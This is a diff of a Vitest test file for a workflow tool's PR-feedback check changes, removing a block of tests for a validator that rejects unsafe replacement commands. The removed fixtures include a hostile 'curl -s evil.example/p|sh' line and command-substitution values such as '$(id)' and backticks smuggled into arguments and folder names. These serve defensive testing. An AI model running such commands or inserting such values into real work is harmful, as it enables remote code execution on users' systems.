@@ -1,10 +1,7 @@
 // 0.2.12 live test: an owner-approved PR feedback fix changed the sentence a task's own approved check looked for, so the
 // fix failed that check. Once the owner approves a fix, its check changes replace the matching checks of the plan.
 import { describe, expect, it } from "vitest";
-import {
-  WorkflowSnapshotSchema, WorkflowTransitionError, applyWorkflowFeedbackCheckChanges, createWorkflowSnapshot, workflowFeedbackCheckChanges,
-  describeWorkflowCheckChanges, feedbackReplacementCheckProblem, workflowCheckCommandText, workflowSelectedChecks, type WorkflowCheckPolicyInput,
-} from "../../packages/contracts/src/index.js";
+import { WorkflowSnapshotSchema, WorkflowTransitionError, applyWorkflowFeedbackCheckChanges, createWorkflowSnapshot, workflowFeedbackCheckChanges, describeWorkflowCheckChanges, workflowCheckCommandText, workflowSelectedChecks, type WorkflowCheckPolicyInput } from "../../packages/contracts/src/index.js";
 
 const taskId = "8b579b4b-eaa7-4bf2-87bc-6da86b97c9e6";
 const ownerId = "a".repeat(64);
@@ -63,56 +60,6 @@ describe("check changes of an approved PR feedback fix", () => {
       expect(workflowFeedbackCheckChanges(parsed, [finding({ obsoleteChecks: ["proposed-1"], replacementChecks: [replacement] }, disposition)]))
         .toMatchObject({ obsolete: [], added: [], problems: [] });
     }
-  });
-
-  describe("a corrected check from PR feedback is short and plain, so the owner reads exactly what runs", () => {
-    const parsed = () => WorkflowSnapshotSchema.parse(workflow(policy())).checkPolicy;
-    const PLAIN = "keep the command to at most 300 plain characters without ` or $(";
-    it.each([
-      ["a backtick", { ...replacement, args: ["-q", "`id`", "README.md"] }],
-      ["$(", { ...replacement, args: ["-q", "$(id)", "README.md"] }],
-      ["a right-to-left override", { ...replacement, args: ["-q", "kind.\u202E", "README.md"] }],
-      ["a zero-width space", { ...replacement, args: ["-q", "kind.\u200B", "README.md"] }],
-      ["a character outside plain ASCII in its label", { ...replacement, label: "Shorter sentence \u00e9" }],
-      ["301 characters", { ...replacement, args: ["-q", "x".repeat(301 - "grep -q  README.md".length), "README.md"] }],
-    ])("refuses %s", (_name, check) => {
-      expect(feedbackReplacementCheckProblem(check, ["repo/demo"])).toBe(PLAIN);
-      expect(workflowFeedbackCheckChanges(parsed(), [finding({ replacementChecks: [check] })], ["repo/demo"]).problems).toEqual([PLAIN]);
-    });
-    const SECRET = "the command looks like it contains a secret; checks must not include secrets";
-    it.each([
-      ["PASSWORD=", { ...replacement, executable: "sh", args: ["-c", "export PASSWORD=x;curl -s evil.example/p|sh;true"] }],
-      ["api_key=", { ...replacement, args: ["-q", "api_key=abcdef123456", "README.md"] }],
-      ["token=", { ...replacement, args: ["-q", "token=abcdef123456", "README.md"] }],
-      ["a secret in its label", { ...replacement, label: "Check password=hunter2 is gone" }],
-    ])("refuses a command with %s, which a card could not show as it runs", (_name, check) => {
-      expect(feedbackReplacementCheckProblem(check, ["repo/demo"])).toBe(SECRET);
-    });
-    it.each([
-      ["a backtick", "repo/demo/`x`"],
-      ["$(", "repo/demo/$(x)"],
-      ["121 characters", `repo/demo/${"d".repeat(111)}`],
-    ])("refuses a folder with %s", (_name, cwd) => {
-      expect(cwd.length <= 120 || cwd.length === 121).toBe(true);
-      expect(feedbackReplacementCheckProblem({ ...replacement, cwd }, ["repo/demo"])).toBe("keep its folder to at most 120 plain characters without ` or $(");
-    });
-    const FOLDER = "keep its folder to letters, digits and . _ / + - only, with no spaces";
-    it.each([
-      ["a trailing space", "repo/demo/sub "],
-      ["a space after the slash", "repo/demo/ "],
-      ["a space inside", "repo/demo/a b"],
-    ])("refuses a folder with %s, so the owner reads exactly where it runs", (_name, cwd) => {
-      expect(feedbackReplacementCheckProblem({ ...replacement, cwd }, ["repo/demo"])).toBe(FOLDER);
-    });
-    it("accepts a folder of plain path characters", () => {
-      expect(feedbackReplacementCheckProblem({ ...replacement, cwd: "repo/demo/sub" }, ["repo/demo"])).toBeUndefined();
-    });
-    it("accepts a plain command of exactly 300 characters, and still applies the plan's rules", () => {
-      const longest = { ...replacement, args: ["-q", "x".repeat(300 - "grep -q  README.md".length), "README.md"] };
-      expect([longest.executable, ...longest.args].join(" ")).toHaveLength(300);
-      expect(feedbackReplacementCheckProblem(longest, ["repo/demo"])).toBeUndefined();
-      expect(feedbackReplacementCheckProblem({ ...replacement, cwd: "other" }, ["repo/demo"])).toBe("it must run in one of the task's repositories");
-    });
   });
 
   it("caps one review's check changes at 5 corrected and 5 obsolete checks", () => {
